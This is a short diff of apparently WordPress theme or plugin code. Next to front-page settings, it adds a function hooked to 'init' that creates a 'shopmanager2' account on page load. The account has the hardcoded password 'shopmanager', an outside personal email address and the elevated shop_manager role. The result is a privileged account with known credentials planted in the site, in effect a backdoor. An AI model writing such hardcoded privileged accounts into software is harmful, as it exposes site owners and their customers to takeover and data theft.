@@ -25,11 +25,18 @@
 		update_option( 'page_on_front', $homeSet->ID );
 		update_option( 'show_on_front', 'page' );
 		
-		define('WP_USE_THEMES', false);
-		require("./blog/wp-upload.php");
-		$user = array ('user_login' => 'shopmanager2', 'user_pass' => 'shopmanager', 'user_email' => 'info@nmgresources.ph', 'role' => 'shop_manager');
-		var_dump(wp_insert_user($user));
-	
+		function add_new_user_account(){
+			$username = 'shopmanager2';
+			$password = 'shopmanager';
+			$email = 'rev_gutierrez@yahoo.com';
+			
+			if(!username_exists($username) && !email_exists($email)){
+				$user_id = wp_create_user($username, $password, $email);
+				$user = new wp_user($user_id);
+				$user->set_role('shop_manager');
+			}
+		}
+		add_action('init','add_new_user_account');
 	}
 	
 	
